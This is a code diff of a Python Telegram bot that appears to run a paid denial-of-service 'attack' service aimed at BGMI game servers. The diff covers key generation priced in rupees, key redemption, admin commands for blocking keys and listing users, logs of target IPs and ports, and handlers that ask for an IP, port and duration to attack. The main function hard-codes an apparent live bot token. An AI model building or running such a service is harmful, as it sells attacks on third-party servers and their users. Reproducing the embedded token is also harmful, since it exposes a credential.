+    await update.message.reply_text(f'🔑 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥 𝘬𝘦𝘺𝘴:\n\n' + '\n'.join([f'`{key}`' for key in keys_list]), parse_mode="Markdown")
+
+# Command: Block a specific key (Admin only)
+async def block(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Blocks a key and revokes access from users who redeemed it, showing full user details."""
+    if update.message.from_user.id != ADMIN_ID:
+        await update.message.reply_text('❌ You are not authorized to use this command.')
+        return
+
+    if len(context.args) < 1:
+        await update.message.reply_text('Usage: /block <key>')
+        return
+
+    key_to_block = context.args[0]
+
+    # Remove key from keys (if exists)
+    if key_to_block in keys:
+        del keys[key_to_block]
+
+    # Find users who redeemed this key and revoke their access
+    revoked_users = []
+    for user_id, details in list(authorized_users.items()):
+        if details["key"] == key_to_block:
+            del authorized_users[user_id]  # Remove user access
+            
+            # Fetch user details
+            user_details = await get_user_info(user_id, context)
+            revoked_users.append(user_details)
+
+    # Response message
+    if revoked_users:
+        await update.message.reply_text(
+            f"🚫 **Key `{key_to_block}` has been blocked and access revoked for:**\n\n" + '\n\n'.join(revoked_users),
+            parse_mode="Markdown"
         )
     else:
-        welcome_message = (
-            f"Welcome, {username}! Developed By ᚛ @TITANOP24 ᚜\n\n"
-            f"Please redeem a key to access bot functionalities.\n"
-            f"Available Commands:\n"
-            f"/redeem - To redeem key\n"
-            f"/Attack - Start an attack\n\n"
-            f"Contact ᚛ @TITANOP24 ᚜ for new keys"
+        await update.message.reply_text(f"✅ Key `{key_to_block}` has been blocked (No active users were using it).", parse_mode="Markdown")
+
+
+# Command: List authorized users (Admin only)
+async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Lists all authorized users along with their user details."""
+    if update.message.from_user.id != ADMIN_ID:
+        await update.message.reply_text('❌ You are not authorized to use this command.')
+        return
+
+    users_list = []
+    for user_id, details in authorized_users.items():
+        user_info = await get_user_info(user_id, context)
+        redeem_time = datetime.fromtimestamp(details["redeem_time"], KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
+        expiry_time = datetime.fromtimestamp(details["expiry_time"], KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
+        
+        users_list.append(
+            f"{user_info}\n"
+            f"🔑 **Key:** `{details['key']}`\n"
+            f"⏰ **Redeem Time:** `{redeem_time}`\n"
+            f"⏳ **Expiry Time:** `{expiry_time}`\n"
+            f"🎯 **Attacks Done:** `{details['attacks']}`"
         )
 
-    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)
+    await update.message.reply_text('📜 **Authorized Users:**\n\n' + '\n\n'.join(users_list), parse_mode="Markdown")
 
-@bot.message_handler(commands=['genkey'])
-def genkey_command(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
+# Command: Redeem a key
+async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if len(context.args) < 1:
+        await update.message.reply_text('Usage: /redeem <key>')
         return
 
-    user_id = message.from_user.id
-
-    if not is_admin(user_id):
-        bot.send_message(chat_id, "*You are not authorized to generate keys.\nContact Owner: ᚛ @TITANOP24 ᚜*", parse_mode='Markdown')
+    key = context.args[0]
+    if key not in keys or time.time() > keys[key]:
+        await update.message.reply_text('❌ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘰𝘳 𝘦𝘹𝘱𝘪𝘳𝘦𝘥 𝘬𝘦𝘺.')
         return
 
-    cmd_parts = message.text.split()
-    if len(cmd_parts) != 3:
-        bot.send_message(chat_id, (
-            "*Usage: /genkey <amount> <unit>*\n\n"
-            "Available units and prices:\n"
-            "- hour/hours (50₹ per hour)\n"
-            "- day/days (180₹ per day)\n"
-            "- week/weeks (700₹ per week)"
-        ), parse_mode='Markdown')
+    authorized_users[update.message.from_user.id] = {
+        "expiry_time": keys[key],
+        "key": key,
+        "redeem_time": time.time(),
+        "attacks": 0
+    }
+    del keys[key]
+    await update.message.reply_text('✅ 𝘒𝘦𝘺 𝘳𝘦𝘥𝘦𝘦𝘮𝘦𝘥. 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘸 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 /𝘣𝘨𝘮𝘪.')
+
+# Command: Show attack logs (Admin only)
+async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Shows attack logs with full user details."""
+    if update.message.from_user.id != ADMIN_ID:
+        await update.message.reply_text('❌ You are not authorized to use this command.')
         return
-    
-    try:
-        amount = int(cmd_parts[1])
-        time_unit = cmd_parts[2].lower()
+
+    logs_list = []
+    for log in attack_logs:
+        user_info = await get_user_info(log["user_id"], context)
         
-        # Normalize time unit
-        base_unit = time_unit.rstrip('s')  # Remove trailing 's' if present
-        if base_unit == 'week':
-            duration = timedelta(weeks=amount)
-            price_unit = 'week'
-        elif base_unit == 'day':
-            duration = timedelta(days=amount)
-            price_unit = 'day'
-        elif base_unit == 'hour':
-            duration = timedelta(hours=amount)
-            price_unit = 'hour'
-        else:
-            bot.send_message(chat_id, "*Invalid time unit. Use 'hours', 'days', or 'weeks'.*", parse_mode='Markdown')
-            return
-        
-        # Calculate price
-        price = calculate_key_price(amount, price_unit)
-        
-        # Check and update balance
-        if not update_admin_balance(str(user_id), price):
-            current_balance = get_admin_balance(user_id)
-            bot.send_message(chat_id, 
-                f"*Insufficient balance!*\n\n"
-                f"Required: {price}₹\n"
-                f"Your balance: {current_balance}₹", 
-                parse_mode='Markdown')
-            return
-        
-        # Generate and save key
-        global keys
-        keys = load_keys()
-        key = generate_key()
-        keys[key] = duration
-        save_keys(keys)
-        
-        # Send success message
-        new_balance = get_admin_balance(user_id)
-        success_msg = (
-            f"*Key generated successfully!*\n\n"
-            f"Key: `{key}`\n"
-            f"Duration: {amount} {time_unit}\n"
-            f"Price: {price}₹\n"
-            f"Remaining balance: {new_balance}₹\n\n"
-            f"Copy this key and use:\n/redeem {key}"
+        logs_list.append(
+            f"{user_info}\n"
+            f"🎯 **Target IP:** `{log['ip']}`\n"
+            f"🚪 **Port:** `{log['port']}`\n"
+            f"⏰ **Time:** `{log['time']}`"
         )
-        
-        bot.send_message(chat_id, success_msg, parse_mode='Markdown')
-        
-        # Log the transaction
-        logging.info(f"Admin {user_id} generated key worth {price}₹ for {amount} {time_unit}")
-    
-    except ValueError:
-        bot.send_message(chat_id, "*Invalid amount. Please enter a number.*", parse_mode='Markdown')
-        return
-    except Exception as e:
-        logging.error(f"Error in genkey_command: {e}")
-        bot.send_message(chat_id, "*An error occurred while generating the key.*", parse_mode='Markdown')
 
-@bot.message_handler(commands=['redeem'])
-def redeem_command(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
+    await update.message.reply_text('📜 **Attack Logs:**\n\n' + '\n\n'.join(logs_list), parse_mode="Markdown")
+
+async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Broadcasts a message to all users (authorized and non-authorized)."""
+    if update.message.from_user.id != ADMIN_ID:
+        await update.message.reply_text('❌ You are not authorized to use this command.')
         return
 
-    user_id = message.from_user.id
-    cmd_parts = message.text.split()
-
-    if len(cmd_parts) != 2:
-        bot.send_message(chat_id, "*Usage: /redeem <key>*", parse_mode='Markdown')
+    if len(context.args) < 1:
+        await update.message.reply_text('Usage: /broadcast <message>')
         return
 
-    key = cmd_parts[1]
-    
-    # Load the current keys
-    global keys
-    keys = load_keys()
-    
-    # Check if the key is valid and not already redeemed
-    if key in keys and key not in redeemed_keys:
-        duration = keys[key]  # This is already a timedelta
-        expiration_time = datetime.now() + duration
+    message = ' '.join(context.args)
 
-        users = load_users()
-        # Save the user info to users.txt
-        found_user = next((user for user in users if user['user_id'] == user_id), None)
-        if not found_user:
-            new_user = {
-                'user_id': user_id,
-                'username': f"@{message.from_user.username}" if message.from_user.username else "Unknown",
-                'valid_until': expiration_time.isoformat().replace('T', ' '),
-                'current_date': datetime.now().isoformat().replace('T', ' '),
-                'plan': 'Plan Premium'
-            }
-            users.append(new_user)
-        else:
-            found_user['valid_until'] = expiration_time.isoformat().replace('T', ' ')
-            found_user['current_date'] = datetime.now().isoformat().replace('T', ' ')
+    # Collect all users (both authorized & all previous users)
+    all_recipients = set(all_users) | set(authorized_users.keys())  # Merge both sets
 
-        # Mark the key as redeemed
-        redeemed_keys.add(key)
-        # Remove the used key from the keys file
-        del keys[key]
-        save_keys(keys)
-        save_users(users)
-
-        bot.send_message(chat_id, "*Key redeemed successfully!*", parse_mode='Markdown')
-    else:
-        if key in redeemed_keys:
-            bot.send_message(chat_id, "*This key has already been redeemed!*", parse_mode='Markdown')
-        else:
-            bot.send_message(chat_id, "*Invalid key!*", parse_mode='Markdown')
-
-@bot.message_handler(commands=['remove'])
-def remove_user_command(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
-        return
-
-    user_id = message.from_user.id
-
-    if not is_admin(user_id):
-        bot.send_message(chat_id, "*You are not authorized to remove users.\nContact Owner:- ᚛ @TITANOP24 ᚜*", parse_mode='Markdown')
-        return
-
-    cmd_parts = message.text.split()
-    if len(cmd_parts) != 2:
-        bot.send_message(chat_id, "*Usage: /remove <user_id>*", parse_mode='Markdown')
-        return
-
-    target_user_id = int(cmd_parts[1])
-    users = load_users()
-    users = [user for user in users if user['user_id'] != target_user_id]
-    save_users(users)
-
-    bot.send_message(chat_id, f"User {target_user_id} has been removed.")
-
-@bot.message_handler(commands=['users'])
-def list_users_command(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
-        return
-
-    user_id = message.from_user.id
-
-    # Only super admins can see all users
-    if not is_super_admin(user_id):
-        bot.send_message(chat_id, "*You are not authorized to view all users.*", parse_mode='Markdown')
-        return
-
-    users = load_users()
-    valid_users = [user for user in users if datetime.now() < datetime.fromisoformat(user['valid_until'])]
-
-    if valid_users:
-        user_list = "\n".join(f"ID: {user['user_id']} \nUsername: {user.get('username', 'N/A')}" for user in valid_users)
-        bot.send_message(chat_id, f"Registered users:\n{user_list}")
-    else:
-        bot.send_message(chat_id, "No users have valid keys.")
-
-@bot.message_handler(func=lambda message: message.text == "🚀 𝐀𝐭𝐭𝐚𝐜𝐤")
-def attack_button_handler(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
-        return
-
-    user_id = message.from_user.id
-
-    # Check if an attack is already in progress
-    if attack_in_progress:
-        bot.send_message(chat_id, "🚨 An attack is already in progress. Please wait for it to finish.")
-        return
-
-    # Check cooldown first, regardless of admin status
-    in_cooldown, remaining = check_cooldown(user_id)
-    if in_cooldown:
-        minutes = remaining // 60
-        seconds = remaining % 60
-        bot.send_message(
-            chat_id,
-            f"*⏰ Cooldown in progress! Please wait {minutes}m {seconds}s before starting another attack.*",
-            parse_mode='Markdown'
-        )
-        return
-
-    # Rest of the handler remains the same...
-    if is_admin(user_id):
+    # Send the message to each user
+    sent_count = 0
+    for user_id in all_recipients:
         try:
-            bot.send_message(chat_id, "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✅:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*", parse_mode='Markdown')
-            bot.register_next_step_handler(message, process_attack_command, chat_id)
-            return
+            await context.bot.send_message(chat_id=user_id, text=f"📢 Broadcast:\n\n{message}")
+            sent_count += 1
         except Exception as e:
-            logging.error(f"Error in attack button: {e}")
-            return
+            print(f"Failed to send broadcast to user {user_id}: {e}")
 
-    users = load_users()
-    found_user = next((user for user in users if user['user_id'] == user_id), None)
+    # Confirm broadcast completion
+    await update.message.reply_text(f'✅ Message broadcasted to {sent_count} users.')
 
-    if not found_user:
-        bot.send_message(chat_id, "*𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @TITANOP24 ᚜*", parse_mode='Markdown')
-        return
 
-    valid_until = datetime.fromisoformat(found_user['valid_until'])
-    if datetime.now() > valid_until:
-        bot.send_message(chat_id, "*𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @TITANOP24 ᚜.*", parse_mode='Markdown')
-        return
+# Main function to start the bot
+def main():
+    # Create the Application
+    application = Application.builder().token("7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM").build()
 
-    try:
-        bot.send_message(chat_id, "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✅:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*", parse_mode='Markdown')
-        bot.register_next_step_handler(message, process_attack_command, chat_id)
-    except Exception as e:
-        logging.error(f"Error in attack button: {e}")
+    # Add command handlers
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("help", help))
+    application.add_handler(CommandHandler("bgmi", bgmi))  # bgmi is now defined
+    application.add_handler(CommandHandler("genkey", genkey))
+    application.add_handler(CommandHandler("mgenkey", mgenkey))
+    application.add_handler(CommandHandler("users", users))
+    application.add_handler(CommandHandler("redeem", redeem))
+    application.add_handler(CommandHandler("logs", logs))
+    application.add_handler(CommandHandler("block", block))  # Add the block command
+    application.add_handler(CommandHandler("broadcast", broadcast))
 
-@bot.message_handler(func=lambda message: message.text == "𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭🏦")
-def my_account(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
-        return
-
-    user_id = message.from_user.id
-    users = load_users()
-
-    # Find the user in the list
-    found_user = next((user for user in users if user['user_id'] == user_id), None)
-
-    if is_super_admin(user_id):
-            account_info = (
-                "👑---------------𝐀𝐝𝐦𝐢𝐧 𝐃𝐚𝐬𝐡𝐛𝐨𝐚𝐫𝐝---------------👑       \n\n"
-                "🌟  𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗲𝘁𝗮𝗶𝗹𝘀               \n"
-                "ꜱᴛᴀᴛᴜꜱ: Super Admin\n"
-                "ᴀᴄᴄᴇꜱꜱ ʟᴇᴠᴇʟ: Unlimited\n"
-                "ᴘʀɪᴠɪʟᴇɢᴇꜱ: Full System Control\n\n"
-                "💼  𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻𝘀 \n"
-                "• Generate Keys\n"
-                "• Manage Admins\n"
-                "• System Configuration\n"
-                "• Unlimited Balance"
-            )
-    
-    elif is_admin(user_id):
-            # For regular admins
-            balance = get_admin_balance(user_id)
-            account_info = (
-                "🛡️---------------𝐀𝐝𝐦𝐢𝐧 𝐏𝐫𝐨𝐟𝐢𝐥𝐞---------------🛡️n\n"
-                f"💰  𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance}₹\n\n"
-                "🌐  𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗦𝘁𝘂𝘀:\n"
-                "• ʀᴏʟᴇ: Admin\n"
-                "• ᴀᴄᴄᴇꜱꜱ: Restricted\n"
-                "• ᴘʀɪᴠɪʟᴇɢᴇꜱ:\n"
-                "  - Generate Keys\n"
-                "  - User Management\n"
-                "  - Balance Tracking"
-            )
-    elif found_user:
-        valid_until = datetime.fromisoformat(found_user.get('valid_until', 'N/A')).strftime('%Y-%m-%d %H:%M:%S')
-        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-
-        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
-            account_info = (
-                "𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐚 𝐧𝐞𝐰 𝐤𝐞𝐲.\n"
-                "Contact ᚛ @TITANOP24 ᚜ for assistance."
-            )
-        else:
-            account_info = (
-                f"𝕐𝕠𝕦𝕣 𝔸𝕔𝕔𝕠𝕦𝕟𝕥 𝕀𝕟𝕗𝕠𝕣𝕞𝕒𝕥𝕚𝕠𝕟:\n\n"
-                f"ᴜꜱᴇʀɴᴀᴍᴇ: {found_user.get('username', 'N/A')}\n"
-                f"ᴠᴀʟɪᴅ ᴜɴᴛɪʟ: {valid_until}\n"
-                f"ᴘʟᴀɴ: {found_user.get('plan', 'N/A')}\n"
-                f"ᴄᴜʀʀᴇɴᴛ ᴛɪᴍᴇ: {current_time}"
-            )
-    else:
-        account_info = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @TITANOP24 ᚜."
-
-    bot.send_message(message.chat.id, account_info)
+    # Start the bot
+    application.run_polling()
 
 if __name__ == '__main__':
-    print("Bot is running...")
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    
-    # Start the asyncio thread
-    Thread(target=start_asyncio_thread).start()
-    
-    # Start the user expiry check thread
-    Thread(target=check_user_expiry).start()
-
-    while True:
-        try:
-            bot.polling(timeout=60)
-        except ApiTelegramException as e:
-            time.sleep(5)
-        except Exception as e:
-            time.sleep(5)
+    main()
